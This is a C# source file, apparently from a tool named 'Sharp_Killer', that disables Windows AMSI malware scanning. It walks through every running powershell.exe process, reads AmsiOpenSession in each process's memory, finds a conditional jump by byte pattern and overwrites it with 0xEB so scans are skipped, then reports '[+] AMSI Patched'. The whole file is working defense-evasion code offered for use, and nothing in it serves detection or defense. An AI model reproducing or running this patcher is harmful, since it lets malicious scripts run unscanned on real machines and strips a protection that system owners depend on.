using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Sharp_Killer
{
    public class AMSIPatcher
    {
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        static List<int> alreadyPatched = new List<int>();

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        };

        [Flags]
        enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F
        }

        private enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        private static readonly UInt32 MEM_COMMIT = 0x1000;
        private static readonly UInt32 MEM_RESERVE = 0x2000;
        private static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
        private static readonly UInt32 PAGE_READWRITE = 0x04;
        private static readonly UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        private enum Process_access
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        private const UInt32 INVALID_HANDLE_VALUE = 0xffffffff;

        //00007FFAE957C650 | 48:85D2 | test rdx, rdx |
        //00007FFAE957C653 | 74 3F | je amsi.7FFAE957C694 |
        //00007FFAE957C655 | 48 : 85C9 | test rcx, rcx |
        //00007FFAE957C658 | 74 3A | je amsi.7FFAE957C694 |
        //00007FFAE957C65A | 48 : 8379 08 00 | cmp qword ptr ds : [rcx + 8] , 0 |
        //00007FFAE957C65F | 74 33 | je amsi.7FFAE957C694 |

        private byte[] patch = new byte[1] { 0xEB };

        /// <summary>
        /// Searches for a specific pattern within a given memory address space represented by a byte array.
        /// </summary>
        /// <param name="startAddress">A byte array representing the memory address to search within.</param>
        /// <param name="searchSize">The size of the memory space to search within.</param>
        /// <param name="pattern">The pattern to search for, which is a combination of bytes and placeholders represented by "?" in the list.</param>
        /// <param name="patternSize">The size of the pattern to match.</param>
        /// <returns>The offset within the memory address space where the pattern is found, or the last index if the pattern is not found.</returns>
        private int SearchPattern(byte[] startAddress, Int64 searchSize, List<object> pattern, Int64 patternSize)
        {
            int i = 0;

            while (i < 1024)
            {

                if (startAddress[i].ToString().Equals(pattern[0].ToString()))
                {
                    int j = 1;
                    while (j < patternSize && i + j < searchSize && (pattern[j].ToString().Equals("?") || startAddress[i + j].ToString().Equals(pattern[j].ToString())))
                        j++;
                    if (j == patternSize)
                        return i + 3;
                }
                i++;
            }
            return i;
        }

        /// <summary>
        /// Patches the AMSI in a target process.
        /// </summary>
        /// <param name="tpid">The process ID of the target process to patch.</param>
        /// <returns>
        ///     <para>-1 if the patching process failed, or</para>
        ///     <para>0 if the patching process was successful.</para>
        /// </returns>
        private int PatchAmsi(int tpid)
        {
            List<object> pattern = new List<object>() { 0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74 };

            int patternSize = pattern.Count;
            if (tpid == 0)
                return -1;

            IntPtr ProcessHandle = OpenProcess((Int32)Process_access.PROCESS_VM_OPERATION | (Int32)Process_access.PROCESS_VM_READ | (Int32)Process_access.PROCESS_VM_WRITE, false, (UInt32)tpid);
            if (ProcessHandle == null)
                return -1;

            IntPtr hm = LoadLibrary("amsi.dll");
            if (hm == null)
                return -1;

            IntPtr AmsiAddr = GetProcAddress(hm, "AmsiOpenSession");
            if (AmsiAddr == null)
                return -1;

            byte[] buff = new byte[1024];
            IntPtr ReadPm = IntPtr.Zero;
            if (!ReadProcessMemory(ProcessHandle, AmsiAddr, buff, 1024, out ReadPm))
                return -1;

            int matchAddress = SearchPattern(buff, buff.Length, pattern, patternSize);
            AmsiAddr += matchAddress;
            int byteswritten = 0;

            if (!WriteProcessMemory(ProcessHandle, AmsiAddr, patch, 1, ref byteswritten))
                return -1;
            return 0;
        }

        /// <summary>
        /// Iterates through running PowerShell processes, patches AMSI if found, and tracks the result.
        /// </summary>
        public void PatchAllPowershells()
        {

            int procId = 0;
            int result = 0;
            string processName = "powershell.exe";

            IntPtr hSnap = CreateToolhelp32Snapshot(SnapshotFlags.Process, 0);

            if ((UInt32)hSnap != INVALID_HANDLE_VALUE)
            {
                PROCESSENTRY32 entry = new PROCESSENTRY32();

                entry.dwSize = (uint)Marshal.SizeOf(entry);

                if (Process32First(hSnap, ref entry))
                {
                    if (entry.th32ProcessID == 0)
                    {
                        Process32Next(hSnap, ref entry);
                        do
                        {
                            if (entry.szExeFile.Equals(processName))
                            {
                                procId = (int)entry.th32ProcessID;

                                if (result == PatchAmsi(procId) && !alreadyPatched.Contains(procId))
                                {
                                    Console.WriteLine("[+] AMSI Patched: " + entry.th32ProcessID);
                                    alreadyPatched.Add(procId);
                                }
                                else if (result == -1)
                                {
                                    Console.WriteLine(entry.th32ProcessID);
                                    Console.WriteLine("Result: " + result);
                                    Console.WriteLine("[-] Patch Failed");
                                }
                            }
                        } while (Process32Next(hSnap, ref entry));
                    }
                }
                CloseHandle(hSnap);
                return;
            }
        }
    }
}
